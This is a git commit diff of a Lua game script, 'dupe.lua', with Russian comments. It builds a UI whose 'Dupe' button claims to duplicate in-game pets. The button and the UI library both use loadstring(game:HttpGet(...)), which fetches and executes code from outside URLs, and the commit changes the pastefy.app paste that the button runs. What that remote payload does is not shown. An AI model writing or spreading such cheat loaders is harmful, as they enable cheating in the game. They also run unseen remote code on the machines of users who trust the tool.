79f9a2e8bddd2116c817e4214a519108b7a26ca6
exclusiv1337 <exclusiv1392@gmail.com>
2025-05-24 14:57:32 +0200

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,19 +1,12 @@
--- Загрузка библиотеки Kavo UI
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-
--- Создание главного окна
 local Window = Library.CreateLib("Dupe Pets", "Serpent")
 
--- Вкладка "Main"
 local MainTab = Window:NewTab("Main")
-local PetsSection = MainTab:NewSection("Dupe Pets")
+local DupeSection = MainTab:NewSection("Pet Duplicator")
 
--- Кнопка для дублирования питомцев
-PetsSection:NewButton("Dupe", "Dragon Fly, Raccoon, Red Fox", function()
-    -- Запуск вашего скрипта при нажатии
-    loadstring(game:HttpGet("https://pastefy.app/TjQF34JK/raw"))()
+-- Кнопка Dupe с пояснением
+DupeSection:NewButton("Dupe", "Click to duplicate: Dragon Fly, Raccoon, Red Fox", function()
+    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
 
--- Вкладка с автором
-local CreditsTab = Window:NewTab("Credits")
-CreditsTab:NewSection("Made By Mangekyu Scripts")
+Window:NewTab("Info"):NewSection("Made By Mangekoy2  | v1.0")
